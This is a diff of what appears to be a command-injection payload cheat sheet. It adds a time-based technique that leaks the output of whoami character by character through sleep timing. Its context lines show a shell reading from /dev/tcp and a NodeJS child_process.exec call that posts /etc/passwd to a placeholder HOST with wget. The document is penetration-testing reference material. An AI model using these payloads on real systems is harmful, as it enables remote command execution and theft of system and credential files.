@@ -40,10 +40,25 @@ Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
+## Time based data exfiltration
+Extracting data : char by char
+```
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+real	0m5.007s
+user	0m0.000s
+sys	0m0.000s
+
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+real	0m0.002s
+user	0m0.000s
+sys	0m0.000s
+```
+
+## Environment based 
 NodeJS Code execution
 ```
 require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ```
 
 ## Thanks to
-* 
+* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
